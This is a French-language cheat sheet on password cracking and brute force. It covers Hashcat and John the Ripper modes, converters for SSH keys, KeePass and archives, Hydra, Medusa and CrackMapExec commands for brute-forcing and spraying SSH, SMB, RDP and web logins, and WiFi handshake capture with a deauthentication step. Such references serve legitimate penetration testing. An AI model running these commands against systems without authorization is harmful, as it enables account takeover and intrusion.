# Cracking et bruteforce de mots de passe

Guide complet pour le cracking de hash et le bruteforce de services.

---

## Hashcat

### Usage basique

```bash
# Attaque dictionnaire
hashcat -m <mode> -a 0 hash.txt wordlist.txt

# Avec règles
hashcat -m <mode> -a 0 hash.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule

# Afficher les mots de passe crackés
hashcat -m <mode> hash.txt --show
```

### Modes courants

| Mode | Type de hash |
|------|--------------|
| 0 | MD5 |
| 100 | SHA1 |
| 1400 | SHA256 |
| 1700 | SHA512 |
| 1800 | sha512crypt (Linux /etc/shadow) |
| 500 | md5crypt (Linux /etc/shadow) |
| 3200 | bcrypt |
| 1000 | NTLM |
| 5600 | NetNTLMv2 |
| 13100 | Kerberos TGS-REP (Kerberoast) |
| 18200 | Kerberos AS-REP (ASREPRoast) |
| 22000 | WPA-PBKDF2-PMKID+EAPOL |
| 11600 | 7-Zip |
| 13600 | WinZip |
| 12500 | RAR3 |
| 13000 | RAR5 |

### Modes d'attaque

| Option | Description |
|--------|-------------|
| `-a 0` | Dictionnaire |
| `-a 1` | Combinaison |
| `-a 3` | Brute-force/Mask |
| `-a 6` | Dict + Mask |
| `-a 7` | Mask + Dict |

### Attaque par masque

```bash
hashcat -m 0 -a 3 hash.txt ?a?a?a?a?a?a

# Caractères de masque :
# ?l = minuscules
# ?u = majuscules
# ?d = chiffres
# ?s = spéciaux
# ?a = tous
```

### Exemples courants

```bash
# Linux shadow
hashcat -m 1800 shadow.txt rockyou.txt

# Windows NTLM
hashcat -m 1000 ntlm.txt rockyou.txt

# NetNTLMv2
hashcat -m 5600 netntlmv2.txt rockyou.txt

# WiFi WPA
hashcat -m 22000 wifi.hc22000 rockyou.txt
```

---

## John the Ripper

### Usage basique

```bash
# Attaque dictionnaire
john hash.txt --wordlist=rockyou.txt

# Afficher les mots de passe crackés
john hash.txt --show

# Format spécifique
john hash.txt --format=raw-md5 --wordlist=rockyou.txt
john hash.txt --format=raw-sha256 --wordlist=rockyou.txt

# Avec règles
john hash.txt --wordlist=rockyou.txt --rules=best64
```

### Formats courants

- `raw-md5`, `raw-sha1`, `raw-sha256`, `raw-sha512`
- `md5crypt`, `sha512crypt` (Linux)
- `nt` (NTLM Windows)
- `netntlmv2`
- `bcrypt`
- `zip`, `rar`, `7z`

### Outils de conversion (john/run/)

```bash
ssh2john id_rsa > ssh_hash.txt
zip2john file.zip > zip_hash.txt
rar2john file.rar > rar_hash.txt
pdf2john file.pdf > pdf_hash.txt
office2john file.docx > office_hash.txt
keepass2john database.kdbx > keepass_hash.txt
gpg2john private.key > gpg_hash.txt
```

---

## Hydra (bruteforce en ligne)

```bash
# SSH
hydra -l user -P passwords.txt ssh://target
hydra -L users.txt -P passwords.txt ssh://target

# FTP
hydra -l user -P passwords.txt ftp://target

# HTTP GET
hydra -l admin -P passwords.txt target http-get /admin

# HTTP POST form
hydra -l admin -P passwords.txt target http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"

# SMB
hydra -l admin -P passwords.txt smb://target

# RDP
hydra -l admin -P passwords.txt rdp://target

# MySQL
hydra -l root -P passwords.txt mysql://target
```

### Options principales

| Option | Description |
|--------|-------------|
| `-l` | Nom d'utilisateur unique |
| `-L` | Liste d'utilisateurs |
| `-p` | Mot de passe unique |
| `-P` | Liste de mots de passe |
| `-t` | Threads (défaut 16) |
| `-V` | Verbose |
| `-f` | Stop au premier valide |

---

## Medusa

```bash
medusa -h target -u user -P passwords.txt -M ssh
medusa -h target -u user -P passwords.txt -M ftp
```

---

## CrackMapExec / NetExec

```bash
# SMB password spray
crackmapexec smb target -u users.txt -p passwords.txt
crackmapexec smb target -u users.txt -p 'Password123!'

# WinRM
crackmapexec winrm target -u user -p passwords.txt
```

---

## Archives protégées

### ZIP

```bash
# fcrackzip
fcrackzip -u -D -p rockyou.txt file.zip
fcrackzip -u -b -c aA1 -l 1-6 file.zip  # brute-force

# John
zip2john file.zip > hash.txt
john hash.txt --wordlist=rockyou.txt

# Hashcat
hashcat -m 13600 hash.txt rockyou.txt  # WinZip
hashcat -m 17200 hash.txt rockyou.txt  # PKZIP
```

### RAR

```bash
rar2john file.rar > hash.txt
john hash.txt --wordlist=rockyou.txt
```

---

## Clés SSH

```bash
ssh2john id_rsa > ssh_hash.txt
john ssh_hash.txt --wordlist=rockyou.txt
```

---

## KeePass

```bash
keepass2john database.kdbx > keepass_hash.txt
john keepass_hash.txt --wordlist=rockyou.txt
# ou hashcat -m 13400
```

---

## WiFi

### Capture du handshake

```bash
airmon-ng start wlan0
airodump-ng wlan0mon
airodump-ng -c <channel> --bssid <bssid> -w capture wlan0mon
aireplay-ng -0 1 -a <bssid> wlan0mon  # deauth
```

### Cracking

```bash
# Aircrack-ng
aircrack-ng -w rockyou.txt capture.cap

# Hashcat (convertir d'abord)
hcxpcapngtool capture.cap -o hash.hc22000
hashcat -m 22000 hash.hc22000 rockyou.txt
```

---

## Wordlists

```
# Rockyou
/usr/share/wordlists/rockyou.txt

# SecLists
/usr/share/seclists/Passwords/Common-Credentials/
/usr/share/seclists/Passwords/Leaked-Databases/
```

### Wordlist personnalisée avec CeWL

```bash
cewl http://target -w custom_wordlist.txt
```
